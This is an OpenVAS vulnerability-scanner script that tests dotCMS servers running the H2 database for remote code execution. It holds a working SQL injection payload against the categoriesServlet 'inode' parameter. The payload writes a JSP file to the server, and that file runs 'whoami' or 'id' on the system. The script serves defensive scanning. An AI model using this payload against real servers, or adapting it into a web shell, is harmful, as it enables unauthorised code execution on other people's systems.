###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_dotcms_rce_vuln.nasl 11901 2018-10-15 08:47:18Z mmartin $
#
# dotCMS H2 Database Remote Code Execution Vulnerability
#
# Authors:
# Christian Kuersteiner <christian.kuersteiner@greenbone.net>
#
# Copyright:
# Copyright (c) 2017 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:dotcms:dotcms";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.106614");
  script_version("$Revision: 11901 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-15 10:47:18 +0200 (Mon, 15 Oct 2018) $");
  script_tag(name:"creation_date", value:"2017-02-21 13:40:30 +0700 (Tue, 21 Feb 2017)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"Mitigation");

  script_name("dotCMS H2 Database Remote Code Execution Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("This script is Copyright (C) 2017 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_dotcms_detect.nasl");
  script_mandatory_keys("dotCMS/installed");

  script_tag(name:"summary", value:"dotCMS is prone to a remote code execution vulnerability if used with the
default H2 database.");

  script_tag(name:"vuldetect", value:"Sends crafted HTTP request and checks the response.");

  script_tag(name:"insight", value:"dotCMS offers a Tomcat server with a preconfigured dotCms installation which
uses the H2 database. The getCreateSortChildren() function of the 'H2CategorySQL' class suffers of an SQL
injection vulnerability into the 'inode' parameter of a GET request, when the 'reorder' parameter is set to
'TRUE'.");

  script_tag(name:"affected", value:"dotCMS with H2 database used.");

  script_tag(name:"solution", value:"dotCMS will not fix this vulnerability since the H2 database is just for
testing and trying out and is not recommended or supported in a productive environment. Please change the used
database to something else than H2 and restrict access to 'categoriesServlet'.");

  script_xref(name:"URL", value:"https://blogs.securiteam.com/index.php/archives/2936");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("url_func.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir =="/")
  dir = "";

file = "openvas_dotcms_test";

js_code = "CHAR(60)||'% String cmd; String[] cmdarr; String OS = System.getProperty(" + '"os.name"' +");" +
          " if (OS.startsWith(" + '"Windows"' + ")) { cmd = new String (" + '"whoami > ' + file + '.txt");' +
          " cmdarr = new String [] {" + '"cmd", "/C",' + " cmd'||CHAR(125)||';'||CHAR(125)||' else {" +
          " cmd = new String (" + '"id > ' + file + '.txt");' + ' cmdarr = new String [] {"/bin/sh", "-c"' +
          ", cmd'||CHAR(125)||';'||CHAR(125)||' Process p = Runtime.getRuntime().exec(cmdarr);%'||CHAR(62)";

sql_inj = "' AND 1=0);DROP TABLE IF EXISTS category_reorder; CREATE TABLE IF NOT EXISTS d(ID INT PRIMARY" +
          " KEY,X VARCHAR(999));INSERT INTO d VALUES(1," + js_code + ");SCRIPT TO '" + file + ".jsp' TABLE d;" +
          "DROP TABLE d;--";

url = dir + "/categoriesServlet?reorder=TRUE&inode=" + urlencode(str: sql_inj);

req = http_get(port: port, item: url);
res = http_keepalive_send_recv(port: port, data: req);

if (res !~ "^HTTP/1.. 200")
  exit(0);

req = http_get(port: port, item: dir + "/" + file + ".jsp");
res = http_keepalive_send_recv(port: port, data: req);

if (res !~ "^HTTP/1.. 200")
  exit(0);

if (http_vuln_check(port: port, url: dir + "/" + file + ".txt", pattern: "uid=[0-9]+.*gid=[0-9]+.*",
                    check_header: TRUE)) {
  report = "It was possible to upload the file ";
  report += report_vuln_url(port: port, url: dir + "/"+ file + ".jsp", url_only: TRUE) + "\n\n";
  report += "The file with the test output is located under ";
  report += report_vuln_url(port: port, url: dir + "/"+ file + ".txt", url_only: TRUE) + "\n\n";
  report += "Please delete this uploaded test files.";
  security_message(port: port, data: report);
  exit(0);
}

exit(0);
